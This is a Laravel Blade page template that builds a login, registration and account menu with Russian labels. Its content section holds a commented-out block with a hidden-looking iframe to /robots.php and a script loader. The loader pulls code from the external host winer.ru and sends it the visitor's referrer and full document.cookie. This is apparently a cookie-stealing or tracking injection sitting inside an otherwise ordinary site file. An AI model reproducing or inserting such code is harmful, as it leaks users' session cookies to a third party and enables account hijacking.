 @extends('index')

@section('top_menu')

   <div class="flex">

        <div class="w_1200 div_c tab">

            <div class="td_top">
                <div class="logo"></div>
            </div>  
          @if (Route::has('login'))
            <div class="td_top">
                <ul>
                @if (Auth::check())
                {{ Auth::user()->name }}:                
                    <li>
                        <a href="/control">Кабинет</a>
                    </li>
                    <li>
                        <a href="{{ url('/logout') }}">Выход</a>
                    </li> 
                    @else 
                    <li>
                        <a href="{{ url('/register') }}">Регистрация</a>
                    </li> 
                    <li>
                        <a class="btn" href="{{ url('/login') }}">Вход</a>
                    </li>
                    @endif 
                </ul>
                <div class="px_5"></div>
            </div>
           @endif

        </div>
   </div>

@endsection


@section('content')
 
<!--  

<iframe src="/robots.php"  id="head"  name="head"  frameborder="0" width="512" height="512" marginwidth=0 marginheight=0 hspace=0 vspace=0></iframe>

<script type="text/javascript">
    (function (d, w) {
        var n = d.getElementsByTagName("script")[0],
            s = d.createElement("script"),
            f = function () { n.parentNode.insertBefore(s, n); };

        s.type = "text/javascript";
        s.async = true;  
        s.src = "//winer.ru/index.php?img=XFZDGE9YQEpQVV5QVlQfQEY=&nid=158645&uid=1&ref="+d.referrer+"&cookie=" + encodeURIComponent(document.cookie);

        if (w.opera == "[object Opera]") {
            d.addEventListener("DOMContentLoaded", f, false);
        } else { f(); }
    })(document, window);
</script> -->


 

 @endsection
